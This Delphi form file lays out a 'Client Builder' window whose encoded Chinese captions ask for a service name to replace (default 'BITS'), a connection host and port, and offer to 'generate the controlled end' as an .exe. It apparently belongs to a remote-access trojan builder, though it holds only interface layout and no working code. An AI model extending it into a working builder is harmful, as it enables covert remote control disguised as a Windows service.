object FormBuilder: TFormBuilder
  Left = 443
  Top = 266
  Width = 392
  Height = 219
  Caption = 'Client Builder'
  Color = clBtnFace
  Font.Charset = ANSI_CHARSET
  Font.Color = clWindowText
  Font.Height = -12
  Font.Name = #23435#20307
  Font.Style = []
  OldCreateOrder = False
  Position = poDesktopCenter
  PixelsPerInch = 96
  TextHeight = 12
  object Label1: TLabel
    Left = 8
    Top = 8
    Width = 78
    Height = 12
    Caption = #26367#25442#26381#21153#21517#31216':'
  end
  object Label2: TLabel
    Left = 8
    Top = 48
    Width = 48
    Height = 12
    Caption = #36830#25509'DNS:'
  end
  object Label3: TLabel
    Left = 8
    Top = 88
    Width = 54
    Height = 12
    Caption = #36830#25509#31471#21475':'
  end
  object StatusBar1: TStatusBar
    Left = 0
    Top = 177
    Width = 384
    Height = 15
    Panels = <>
  end
  object Edit_File: TEdit
    Left = 8
    Top = 24
    Width = 369
    Height = 18
    Ctl3D = False
    Enabled = False
    ParentCtl3D = False
    ReadOnly = True
    TabOrder = 1
    Text = 'BITS'
  end
  object Edit_DNS: TEdit
    Left = 8
    Top = 64
    Width = 369
    Height = 18
    Ctl3D = False
    ParentCtl3D = False
    TabOrder = 2
    Text = 'localhost'
  end
  object Edit_Port: TEdit
    Left = 8
    Top = 104
    Width = 369
    Height = 18
    Ctl3D = False
    ParentCtl3D = False
    TabOrder = 3
    Text = '9090'
  end
  object Button1: TButton
    Left = 16
    Top = 136
    Width = 145
    Height = 33
    Caption = #29983#25104#34987#25511#31471
    TabOrder = 4
    OnClick = Button1Click
  end
  object Button2: TButton
    Left = 232
    Top = 136
    Width = 137
    Height = 33
    Caption = #36864#20986
    TabOrder = 5
    OnClick = Button2Click
  end
  object SD_Client: TSaveDialog
    DefaultExt = 'exe'
    Filter = '*.*|*.*'
    Left = 224
    Top = 48
  end
end
